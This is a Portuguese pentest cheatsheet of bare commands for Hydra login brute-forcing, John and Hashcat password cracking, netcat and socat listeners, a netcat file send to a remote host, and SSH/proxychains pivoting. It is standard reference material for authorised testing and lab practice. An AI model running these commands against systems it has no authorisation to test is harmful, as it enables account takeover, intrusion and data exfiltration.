# Cheatsheet: Exploração e Pós-Exploração

## Hydra
```bash
hydra -l admin -P passwords.txt ssh://IP
hydra -l user -P passwords.txt ftp://IP
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## John the Ripper
```bash
john hash.txt --wordlist=/usr/share/seclists/Passwords/Top10000.txt
john --show hash.txt
john --format=raw-md5 hash.txt
```

## Hashcat
```bash
hashcat -m 0 hash.txt wordlist.txt     # MD5
hashcat -m 1000 hash.txt wordlist.txt  # NTLM
hashcat -m 1800 hash.txt wordlist.txt  # sha512crypt
```

## Netcat
```bash
nc -lvnp 4444                    # Listener
nc IP 4444                       # Conectar
nc -zv IP 1-1000                 # Port scan
nc IP 4444 < file.txt            # Enviar arquivo
```

## Socat
```bash
socat TCP-LISTEN:4444,reuseaddr,fork STDOUT  # Listener
socat OPENSSL-LISTEN:4444,cert=server.pem STDOUT  # SSL
```

## Pivoting
```bash
ssh -D 1080 user@IP              # SOCKS proxy
ssh -L 8080:target:80 user@IP    # Local forward
ssh -R 9090:localhost:80 user@IP # Remote forward
proxychains4 nmap -sV -Pn 10.0.0.0/24
```